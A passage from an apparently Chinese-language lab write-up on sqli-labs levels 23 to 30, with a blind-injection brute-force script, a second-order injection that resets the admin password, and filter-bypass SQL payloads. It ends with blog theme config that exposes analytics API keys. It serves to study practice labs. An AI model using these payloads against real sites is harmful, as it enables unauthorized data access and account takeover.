url)\n\t\t\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">if</span>(num1 == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> num2 == <span class=\"hljs-number\">1</span>):\n\t\tnum = <span class=\"hljs-number\">65</span>\n\t\tnum += <span class=\"hljs-number\">13</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\tnum += <span class=\"hljs-number\">6</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">7</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\tnum += <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext != txt4):\n\t\t\tnum -= <span class=\"hljs-number\">3</span>\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4) <span class=\"hljs-keyword\">and</span> ((num == <span class=\"hljs-number\">74</span>) <span class=\"hljs-keyword\">or</span> (num == <span class=\"hljs-number\">87</span>)):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">4</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">3</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">if</span>(num2 == <span class=\"hljs-number\">0</span> <span class=\"hljs-keyword\">and</span> num3 == <span class=\"hljs-number\">1</span>):\n\t\tnum =<span class=\"hljs-number\">48</span>\n\t\tnum += <span class=\"hljs-number\">5</span>\n\t\turl = txt1+str(i)+txt2+str(num)\n\t\treq = requests.get(url = url)\n\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">5</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span>\n\t\t<span class=\"hljs-keyword\">else</span>:\n\t\t\tnum -= <span class=\"hljs-number\">5</span>\n\t\t\t<span class=\"hljs-keyword\">for</span> j <span class=\"hljs-keyword\">in</span> range(num,num+<span class=\"hljs-number\">5</span>):\n\t\t\t\turl = txt1+str(i)+txt3+str(j)\n\t\t\t\treq = requests.get(url = url)\n\t\t\t\treqtext = req.text[<span class=\"hljs-number\">554</span>:<span class=\"hljs-number\">569</span>]\n\t\t\t\t<span class=\"hljs-keyword\">if</span>(reqtext == txt4):\n\t\t\t\t\tcode += chr(j)\n\t\t\t\t\t<span class=\"hljs-keyword\">print</span> code\n\t\t\t\t\tnum1 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum2 = <span class=\"hljs-number\">0</span>\n\t\t\t\t\tnum3 = <span class=\"hljs-number\">0</span></code></pre></p>\n<p><img src=\"/img/2018-08-17/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"></p>\n<h5 id=\"第二十四关\"><a href=\"#第二十四关\" class=\"headerlink\" title=\"第二十四关\"></a>第二十四关</h5><p>这道题目考的是二次注入，可以理解为第一滴构造可以注入的条件，第二次才实施注入<br>从源代码上看login.php、login_create.php都被做了过滤<br><pre><code class=\"hljs undefined\">//login.php\n<span class=\"hljs-meta\">$</span><span class=\"bash\">username = mysql_real_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">\"login_user\"</span>]);</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">password = mysql_real_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">\"login_password\"</span>]);</span>\n\n//login_create.php\n<span class=\"hljs-meta\">$</span><span class=\"bash\">username=  mysql_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'username'</span>]) ;</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">pass= mysql_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'password'</span>]);</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">re_pass= mysql_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'re_password'</span>]);</span></code></pre></p>\n<p>mysql_real_escape_string的作用–&gt;<a href=\"http://www.w3school.com.cn/php/func_mysql_real_escape_string.asp\" target=\"_blank\" rel=\"noopener\">传送门</a><br>mysql_escape_string的作用–&gt;<a href=\"http://www.gimoo.net/t/1410/542e28a1e826e.html\" target=\"_blank\" rel=\"noopener\">传送门</a><br>只有在pass_change.php的username没有做过滤<br><pre><code class=\"hljs undefined\"><span class=\"hljs-meta\">$</span><span class=\"bash\">username= <span class=\"hljs-variable\">$_SESSION</span>[<span class=\"hljs-string\">\"username\"</span>];</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">curr_pass= mysql_real_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'current_password'</span>]);</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">pass= mysql_real_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'password'</span>]);</span>\n<span class=\"hljs-meta\">$</span><span class=\"bash\">re_pass= mysql_real_escape_string(<span class=\"hljs-variable\">$_POST</span>[<span class=\"hljs-string\">'re_password'</span>]);</span></code></pre></p>\n<p>假设我们要攻击的用户名为admin，二次注入的方法原理为构造特殊的用户名<code>admin&#39;#</code>，在修改<code>admin&#39;#</code>的用户密码的时候会由于mysql更新语句<br><pre><code class=\"hljs undefined\">$sql = \"<span class=\"hljs-keyword\">UPDATE</span> <span class=\"hljs-keyword\">users</span> <span class=\"hljs-keyword\">SET</span> <span class=\"hljs-keyword\">PASSWORD</span>=<span class=\"hljs-string\">'$pass'</span> <span class=\"hljs-keyword\">where</span> username=<span class=\"hljs-string\">'$username'</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">password</span>=<span class=\"hljs-string\">'$curr_pass'</span> <span class=\"hljs-string\">\";</span></code></pre></p>\n<p>变为<br><pre><code class=\"hljs undefined\">UPDATE<span class=\"hljs-built_in\"> users </span><span class=\"hljs-builtin-name\">SET</span> <span class=\"hljs-attribute\">PASSWORD</span>=<span class=\"hljs-string\">'pass'</span> where <span class=\"hljs-attribute\">username</span>=<span class=\"hljs-string\">'admin'</span>#' <span class=\"hljs-keyword\">and</span> <span class=\"hljs-attribute\">password</span>=<span class=\"hljs-string\">'pass'</span> <span class=\"hljs-string\">\";</span></code></pre></p>\n<p>这样就可以达到修改admin的密码的目的<br>第一步，构建特殊用户名，密码随意<br><img src=\"/img/2018-08-17/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br>登陆后修改密码，当前密码不用填，因为已经注释掉了<br><img src=\"/img/2018-08-17/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>这样就可以修改admin的密码了<br><pre><code class=\"hljs undefined\">mysql&gt; select <span class=\"hljs-symbol\">*</span> from users;\n+----+----------+------------+\n|<span class=\"hljs-string\"> id </span>|<span class=\"hljs-string\"> username </span>|<span class=\"hljs-string\"> password   </span>|\n+----+----------+------------+\n|<span class=\"hljs-string\">  1 </span>|<span class=\"hljs-string\"> Dumb     </span>|<span class=\"hljs-string\"> Dumb       </span>|\n|<span class=\"hljs-string\">  2 </span>|<span class=\"hljs-string\"> Angelina </span>|<span class=\"hljs-string\"> I-kill-you </span>|\n|<span class=\"hljs-string\">  3 </span>|<span class=\"hljs-string\"> Dummy    </span>|<span class=\"hljs-string\"> p@ssword   </span>|\n|<span class=\"hljs-string\">  4 </span>|<span class=\"hljs-string\"> secure   </span>|<span class=\"hljs-string\"> crappy     </span>|\n|<span class=\"hljs-string\">  5 </span>|<span class=\"hljs-string\"> stupid   </span>|<span class=\"hljs-string\"> stupidity  </span>|\n|<span class=\"hljs-string\">  6 </span>|<span class=\"hljs-string\"> superman </span>|<span class=\"hljs-string\"> genious    </span>|\n|<span class=\"hljs-string\">  7 </span>|<span class=\"hljs-string\"> batman   </span>|<span class=\"hljs-string\"> mob!le     </span>|\n|<span class=\"hljs-string\">  8 </span>|<span class=\"hljs-string\"> admin    </span>|<span class=\"hljs-string\"> 123        </span>|<span class=\"hljs-string\"> \t//admin的默认密码是admin\n</span>|<span class=\"hljs-string\">  9 </span>|<span class=\"hljs-string\"> admin1   </span>|<span class=\"hljs-string\"> admin1     </span>|\n|<span class=\"hljs-string\"> 10 </span>|<span class=\"hljs-string\"> admin2   </span>|<span class=\"hljs-string\"> admin2     </span>|\n|<span class=\"hljs-string\"> 11 </span>|<span class=\"hljs-string\"> admin3   </span>|<span class=\"hljs-string\"> admin3     </span>|\n|<span class=\"hljs-string\"> 12 </span>|<span class=\"hljs-string\"> dhakkan  </span>|<span class=\"hljs-string\"> dumbo      </span>|\n|<span class=\"hljs-string\"> 14 </span>|<span class=\"hljs-string\"> admin4   </span>|<span class=\"hljs-string\"> admin4     </span>|\n|<span class=\"hljs-string\"> 17 </span>|<span class=\"hljs-string\"> admin'#  </span>|<span class=\"hljs-string\"> 123        </span>|\n+----+----------+------------+\n14 rows in set (0.00 sec)</code></pre></p>\n<h5 id=\"第二十五关\"><a href=\"#第二十五关\" class=\"headerlink\" title=\"第二十五关\"></a>第二十五关</h5><p>过滤<code>and</code>和<code>or</code><br>首先测试<code>id=1&#39;</code>报错说明存在单引号注入，测试<code>id=1&#39; and &#39;1&#39;=&#39;1</code>返回正常但不是id为1的页面，从下方的提示也可以看到and被过滤掉了<br><img src=\"/img/2018-08-17/6.png\" srcset=\"/img/static/loading.gif\" alt=\"6\"><br>测试<code>id=1&#39; anandd &#39;1&#39;=&#39;1</code>返回正常说明and只被过滤了一次<br><img src=\"/img/2018-08-17/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br>只要把and或or双写就可以绕过了<br>还有一种方法是用逻辑运算符代替，用<code>&amp;&amp;</code>代替<code>and</code>,用<code>||</code>代替<code>or</code></p>\n<h5 id=\"第二十五A关\"><a href=\"#第二十五A关\" class=\"headerlink\" title=\"第二十五A关\"></a>第二十五A关</h5><p>这一关考的是过滤了and和or的盲注，同样过滤了and和or，可以用&amp;&amp;和||代替和双写绕过<br><pre><code class=\"hljs undefined\">id=1 anandd if(<span class=\"hljs-name\">length</span>(<span class=\"hljs-name\">database</span>())&gt;8,sleep(<span class=\"hljs-number\">5</span>),sleep(<span class=\"hljs-number\">10</span>)) #</code></pre></p>\n<p>实测发现可以不用盲注直接注入<br><pre><code class=\"hljs undefined\">id=-<span class=\"hljs-number\">1</span> <span class=\"hljs-class\"><span class=\"hljs-keyword\">union</span> <span class=\"hljs-title\">select</span> 1,<span class=\"hljs-title\">database</span>(),3</span></code></pre></p>\n<h5 id=\"第二十六关\"><a href=\"#第二十六关\" class=\"headerlink\" title=\"第二十六关\"></a>第二十六关</h5><p>这关过滤了空格和注释<br><pre><code class=\"hljs undefined\">function blacklist(<span class=\"hljs-variable\">$id</span>)\n&#123;\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/or/i'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//strip</span> out OR (non <span class=\"hljs-keyword\">case</span> sensitive)\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/and/i'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//</span>Strip out AND (non <span class=\"hljs-keyword\">case</span> sensitive)\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[\\/\\*]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//strip</span> out /*\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[--]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//</span>Strip out --\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[#]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//</span>Strip out <span class=\"hljs-comment\">#</span>\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[\\s]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//</span>Strip out spaces\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[\\/\\\\\\\\]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t<span class=\"hljs-regexp\">//</span>Strip out slashes\n<span class=\"hljs-keyword\">return</span> <span class=\"hljs-variable\">$id</span>;\n&#125;</code></pre></p>\n<p>替换空格的方法有<br><pre><code class=\"hljs undefined\"><span class=\"xml\"></span><span class=\"perl\">%09 --TAB键（水平）</span><span class=\"xml\">\n</span><span class=\"perl\">%0a --新建一行</span><span class=\"xml\">\n</span><span class=\"perl\">%0c --新的一页</span><span class=\"xml\">\n</span><span class=\"perl\">%0d --<span class=\"hljs-keyword\">return</span></span><span class=\"xml\">\n</span><span class=\"perl\">%0b --TAB（垂直）</span><span class=\"xml\">\n</span><span class=\"perl\">%a0 --空格</span><span class=\"xml\"></span></code></pre></p>\n<p>最后一个会报错，在linux下可以，跟apache解析有关，测试payload为<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">-1</span>'%<span class=\"hljs-number\">09</span>anandd%<span class=\"hljs-number\">09</span>'<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span></code></pre></p>\n<p><b style=\"font-size: 6\">然而</b><br>测试union语句竟然失败了，经过多次反复测试发现上述替换都会被过滤，<b><code>id=1&#39;anandd&#39;1&#39;=&#39;1</code></b>不加空格可以注入成功，网上找到一个盲注的方法，但还是有点缺陷<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>'anandd(ascii(substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;=<span class=\"hljs-number\">97</span>)anandd'<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span></code></pre></p>\n<p>有待补充</p>\n<h5 id=\"第二十六A关\"><a href=\"#第二十六A关\" class=\"headerlink\" title=\"第二十六A关\"></a>第二十六A关</h5><p>这一关和上一关一样，只不过sql语句多了括号<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>')anandd(ascii(substr(database(),<span class=\"hljs-number\">1</span>,<span class=\"hljs-number\">1</span>))&gt;=<span class=\"hljs-number\">97</span>)anandd('<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span></code></pre></p>\n<h5 id=\"第二十七关\"><a href=\"#第二十七关\" class=\"headerlink\" title=\"第二十七关\"></a>第二十七关</h5><p>过滤了union和select，下面是过滤代码<br><pre><code class=\"hljs undefined\"><span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">blacklist</span><span class=\"hljs-params\">($id)</span>\n</span>&#123;\n$id= preg_replace(<span class=\"hljs-string\">'/[\\/\\*]/'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t<span class=\"hljs-comment\">//strip out /*</span>\n$id= preg_replace(<span class=\"hljs-string\">'/[--]/'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t<span class=\"hljs-comment\">//Strip out --.</span>\n$id= preg_replace(<span class=\"hljs-string\">'/[#]/'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t<span class=\"hljs-comment\">//Strip out #.</span>\n$id= preg_replace(<span class=\"hljs-string\">'/[ +]/'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out spaces.</span>\n$id= preg_replace(<span class=\"hljs-string\">'/select/m'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out spaces.</span>\n$id= preg_replace(<span class=\"hljs-string\">'/[ +]/'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out spaces.</span>\n$id= preg_replace(<span class=\"hljs-string\">'/union/s'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out union</span>\n$id= preg_replace(<span class=\"hljs-string\">'/select/s'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out select</span>\n$id= preg_replace(<span class=\"hljs-string\">'/UNION/s'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out UNION</span>\n$id= preg_replace(<span class=\"hljs-string\">'/SELECT/s'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out SELECT</span>\n$id= preg_replace(<span class=\"hljs-string\">'/Union/s'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out Union</span>\n$id= preg_replace(<span class=\"hljs-string\">'/Select/s'</span>,<span class=\"hljs-string\">\"\"</span>, $id);\t    <span class=\"hljs-comment\">//Strip out select</span>\n<span class=\"hljs-keyword\">return</span> $id;\n&#125;</code></pre></p>\n<p>对比二十六关过滤空格的代码少了<br><pre><code class=\"hljs undefined\"><span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[\\s]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t<span class=\"hljs-regexp\">//</span>Strip out spaces\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[\\/\\\\\\\\]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t<span class=\"hljs-regexp\">//</span>Strip out slashes</code></pre></p>\n<p>union可以双写绕过也可以大小写绕过，select要三写才可以绕过，或者大小写绕过,%09可以替换空格，猜测二十六关提到的替换方法应该也可以，注释可以用<code>and&#39;1&#39;=&#39;1</code>闭合<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">0</span>' uniounionn%<span class=\"hljs-number\">09</span>selecselselectectt%<span class=\"hljs-number\">091</span>,database(),<span class=\"hljs-number\">3</span>%<span class=\"hljs-number\">09</span>and '<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span>\nid=<span class=\"hljs-number\">0</span>'%<span class=\"hljs-number\">09</span>UnIoN%<span class=\"hljs-number\">09</span>sElEcT%<span class=\"hljs-number\">091</span>,database(),<span class=\"hljs-number\">3</span>%<span class=\"hljs-number\">09</span>and%<span class=\"hljs-number\">09</span>'<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span></code></pre></p>\n<p><img src=\"/img/2018-08-17/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"></p>\n<h5 id=\"第二十七A关\"><a href=\"#第二十七A关\" class=\"headerlink\" title=\"第二十七A关\"></a>第二十七A关</h5><p>和二十七关一样，单引号边双引号，用二十七关的方法即可绕过<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">0</span><span class=\"hljs-string\">\"%09UnIoN%09sElEcT%091,database(),3%09and%09\"</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">\"=\"</span><span class=\"hljs-number\">1</span></code></pre></p>\n<h5 id=\"第二十八关\"><a href=\"#第二十八关\" class=\"headerlink\" title=\"第二十八关\"></a>第二十八关</h5><p>这一关过滤了<code>union select</code>，所以要吧这个双写，把过滤代码的注释去掉要再写一次select<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>')%<span class=\"hljs-number\">09</span>uniunion%<span class=\"hljs-number\">09</span>selselectectoN%<span class=\"hljs-number\">09</span>SeLeCt%<span class=\"hljs-number\">091</span>,database(),<span class=\"hljs-number\">3</span>%<span class=\"hljs-number\">09</span>and%<span class=\"hljs-number\">09</span>('<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span></code></pre></p>\n<h5 id=\"第二十A关\"><a href=\"#第二十A关\" class=\"headerlink\" title=\"第二十A关\"></a>第二十A关</h5><p>源代码把二十八关前面的都注释了，保留了最后一个<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">function</span> blacklist(<span class=\"hljs-variable\">$id</span>)\n&#123;\n//<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[\\/\\*]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t//strip out /*\n//<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[--]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t//Strip out --.\n//<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[#]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t\t//Strip out <span class=\"hljs-comment\">#.</span>\n//<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[ +]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t    \t//Strip out spaces.\n//<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/select/m'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t   //Strip out spaces.\n//<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/[ +]/'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t    \t//Strip out spaces.\n<span class=\"hljs-variable\">$id</span>= preg_replace(<span class=\"hljs-string\">'/union\\s+select/i'</span>,<span class=\"hljs-string\">\"\"</span>, <span class=\"hljs-variable\">$id</span>);\t    //Strip out spaces.\n<span class=\"hljs-built_in\">return</span> <span class=\"hljs-variable\">$id</span>;\n&#125;</code></pre></p>\n<p>直接双写<code>union select</code><br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">1</span>') uniounion selectn select <span class=\"hljs-number\">1</span>,database(),<span class=\"hljs-number\">3</span> and ('<span class=\"hljs-number\">1</span>'='<span class=\"hljs-number\">1</span></code></pre></p>\n<h5 id=\"第二十九关\"><a href=\"#第二十九关\" class=\"headerlink\" title=\"第二十九关\"></a>第二十九关</h5><p><b style=\"font-size: 30px\">emmm……</b><br><img src=\"/img/2018-08-17/9.png\" srcset=\"/img/static/loading.gif\" alt=\"9\"><br>“This site protected by world’s best Firewall”,really？。感觉一点过滤都没有。。。</p>\n<h5 id=\"第三十关\"><a href=\"#第三十关\" class=\"headerlink\" title=\"第三十关\"></a>第三十关</h5><p>感觉和第二十九关一样<br><pre><code class=\"hljs undefined\">id=<span class=\"hljs-number\">0</span><span class=\"hljs-string\">\" union select 1,database(),3 and \"</span><span class=\"hljs-number\">1</span><span class=\"hljs-string\">\"=\"</span><span class=\"hljs-number\">1</span></code></pre></p>\n<div style=\"text-align: center\"><br><b style=\"font-size: 30px;\">卒</b><br></div>","site":{"data":{"fluid_config":{"favicon":"/img/static/favicon.ico","apple_touch_icon":"/img/static/favicon.ico","title_join_string":" - ","force_https":false,"code":{"copy_btn":true,"highlight":{"enable":true,"lib":"highlightjs","highlightjs":{"style":"Github Gist","bg_color":false},"prismjs":{"style":"default","preprocess":true}}},"fun_features":{"typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"mouse_click":{"enable":false,"style":"values"}},"dark_mode":{"enable":true,"default":"auto"},"color":{"body_bg_color":"#eee","body_bg_color_dark":"#181c27","navbar_bg_color":"#2f4154","navbar_bg_color_dark":"#1f3144","navbar_text_color":"#fff","navbar_text_color_dark":"#d0d0d0","text_color":"#3c4858","text_color_dark":"#c4c6c9","sec_text_color":"#718096","sec_text_color_dark":"#a7a9ad","post_text_color":"#2c3e50","post_text_color_dark":"#c4c6c9","post_heading_color":"#1a202c","post_heading_color_dark":"#c4c6c9","post_link_color":"#0366d6","post_link_color_dark":"#1589e9","link_hover_color":"#30a9de","link_hover_color_dark":"#30a9de","link_hover_bg_color":"#f8f9fa","link_hover_bg_color_dark":"#364151","board_color":"#fff","board_color_dark":"#252d38"},"font":{"font_size":"16px","font_family":null,"code_font_size":"85%"},"custom_js":null,"custom_css":null,"custom_html":"","web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"3vyTx5QfwzFij2bEnjvRIcxV-gzGzoHsz","app_key":"neatHwvRMvcDYnNxMBbGGFlP","server_url":"https://3vytx5qf.lc-cn-n1-shared.com"}},"lazyload":{"enable":true,"onlypost":false},"daovoice":{"enable":false,"appid":""},"aplayer":{"enable":false,"autoplay":false,"loop":"all","order":"random","theme":"#b7daff","songs":[{"name":"name","artist":"artist","url":"/songs/test.mp3","cover":"/img/cover.jpg"},{"name":"name","artist":"artist","url":"https://...url.mp3","cover":"https://...cover.jpg"}]},"version":{"check":false},"navbar":{"blog_title":"Lzywi'Blog","ground_glass":{"enable":false,"px":3,"alpha":0.7},"menu":[{"key":"home","link":"/","icon":"iconfont icon-home-fill"},{"key":"archive","link":"/archives/","icon":"iconfont icon-archive-fill"},{"key":"tag","link":"/tags/","icon":"iconfont icon-tags-fill"},{"key":"links","link":"/links/","icon":"iconfont icon-link-fill"},{"key":"about","link":"/about/","icon":"iconfont icon-user-fill"}]},"search":{"enable":true,"path":"/local-search.xml","generate_path":"/local-search.xml","field":"post","content":true},"scroll_down_arrow":{"enable":true,"banner_height_limit":90,"scroll_after_turning_page":true},"banner_parallax":true,"footer":{"statistics":{"enable":true,"source":"leancloud","pv_format":"总访问量 {} 次","uv_format":"总访客数 {} 人"},"allwordcount":{"enable":true,"format":"全站共计:{} 字"},"beian":{"enable":false,"icp_text":"京ICP证123456号","police_text":"京公网安备12345678号","police_code":12345678,"police_icon":"/img/static/police_beian.png"}},"scroll_top_arrow":{"enable":true},"index":{"banner_img":"/img/static/default2.jpg","banner_img_height":100,"banner_mask_alpha":0.3,"post_default_img":"","slogan":{"enable":true,"text":""},"hitokoto":{"enable":true},"auto_excerpt":{"enable":true},"post_url_target":"_self","post_meta":{"date":true,"category":true,"tag":true}},"page":{"banner_img":"/img/static/default2.jpg","banner_img_height":60,"banner_mask_alpha":0.3},"post":{"banner_img":"/img/static/default.jpg","banner_img_height":70,"banner_mask_alpha":0.3,"meta":{"author":{"enable":false},"date":{"enable":true,"format":"LL a"},"wordcount":{"enable":true,"format":"字数统计:{} 